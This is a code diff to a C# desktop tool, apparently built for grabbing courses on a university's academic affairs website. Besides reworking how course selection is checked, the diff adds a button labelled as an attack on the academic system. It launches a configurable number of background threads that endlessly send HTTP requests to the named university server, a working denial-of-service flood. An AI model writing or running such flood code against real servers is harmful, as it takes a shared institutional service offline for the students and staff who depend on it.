@@ -121,6 +121,34 @@ namespace FuckJW2005
         {
             if (e.KeyChar == '\r' && goFuck.Enabled) goFuck.PerformClick();
         }
+        private void attackJW_Click(object sender, EventArgs e)
+        {
+            if (dosThd != null)
+            {
+                foreach (var item in dosThd)
+                {
+                    item.Abort();
+                }
+                dosThd = null;
+                attackJW.Text = "攻击教务系统\r\n(后果自负)";
+                AtkThdCount.Enabled = true;
+                return;
+            }
+
+
+            if (AtkThdCount.Value == 0) return;
+            AtkThdCount.Enabled = false;
+            
+            dosThd = new Thread[(int)AtkThdCount.Value];
+            for (int i = 0; i < AtkThdCount.Value; i++)
+            {
+                dosThd[i] = new Thread(dosThdCallback);
+                dosThd[i].IsBackground = true;
+                dosThd[i].Name = "Dos攻击线程";
+                dosThd[i].Start();
+            }
+            attackJW.Text = "停止攻击";
+        }
         #endregion
 
         private string __VIEWSTATE = "";
@@ -244,6 +272,7 @@ namespace FuckJW2005
         }
         #endregion
 
+        #region course fetch
         private int total_records = 0;
         private List<courses> course_list = null;
         private struct courses
@@ -379,10 +408,12 @@ namespace FuckJW2005
                         courseName.Items.Add(item.Name);
                     }
                 }));
+                debug_output("获取完成");
             }
-            debug_output("获取完成");
         }
+        #endregion
 
+        #region course select
         private Thread _selectClassThd;
         private bool threadUsing;
         private bool check_course_selected(string html_in)
@@ -391,7 +422,39 @@ namespace FuckJW2005
             var suc = !match.Success;
             if (suc)
             {
-                debug_output("选课成功");
+                //parsing course property
+                var ptr_course_table = "<fieldset><legend>已选课程</legend>(?<data>.*?)</fieldset>";
+                var course_table_str = Regex.Match(html_in, ptr_course_table).Result("${data}");
+                match = Regex.Match(course_table_str, "<tr>(?<data>.*?)</tr>");
+                while (match.Success)
+                {
+                    var crs = new courses();
+                    var sub_info = Regex.Match(match.Result("${data}"), "<td.*?>(?<data>.*?)</td>");
+                    //sect 0
+                    sub_info = sub_info.NextMatch();
+                    //sect 1 course name
+                    var sub_info2 = Regex.Match(sub_info.Result("${data}"), "<a.*?>(?<name>.+?)</a>");
+                    crs.Name = sub_info2.Result("${name}");
+                    sub_info = sub_info.NextMatch();
+                    //sect 2 code
+                    crs.Code = int.Parse(sub_info.Result("${data}"));
+                    sub_info = sub_info.NextMatch();
+                    //sect 3 teacher
+                    sub_info2 = Regex.Match(sub_info.Result("${data}"), "<a.*?>(?<name>.+?)</a>");
+                    crs.Teacher = sub_info2.Result("${name}");
+                    sub_info = sub_info.NextMatch();
+                    match = match.NextMatch();
+
+                    string course_name = "", teacher_name = "";
+                    Invoke(new NoArgSTA(delegate { course_name = courseName.Text; teacher_name = teacher.Text; }));
+                    if (crs.Name == course_name)
+                    {
+                        debug_output("选课成功");
+                        return true;
+                    }
+                }
+                debug_output("选课失败");
+                return false;
             }
             else
             {
@@ -442,7 +505,7 @@ namespace FuckJW2005
 
             response_sr.Close();
 
-            return check_course_selected(response_str);
+            return check_course_selected(response_str.Replace("\r", "").Replace("\n", ""));
         }
         private void select_course_callback()
         {
@@ -524,7 +587,33 @@ namespace FuckJW2005
             _selectClassThd = null;
             threadUsing = false;
         }
+        #endregion
 
+        #region ddos jw system
+        private Thread[] dosThd;
+        private void dosThdCallback()
+        {
+            try
+            {
+                do
+                {
+                    var url = "http://jw2005.scuteo.com/";
+                    try
+                    {
+                        var stream = util.http_get(ref url, enable_event_callback: false, retry_delay: 0);
+                        stream.Close();
+                    }
+                    catch (ThreadAbortException) { throw; }
+                    catch (Exception)
+                    {
+                    }
+                } while (true);
+            }
+            catch (Exception)
+            {
+            }
+        }
+        #endregion
     }
 
 }
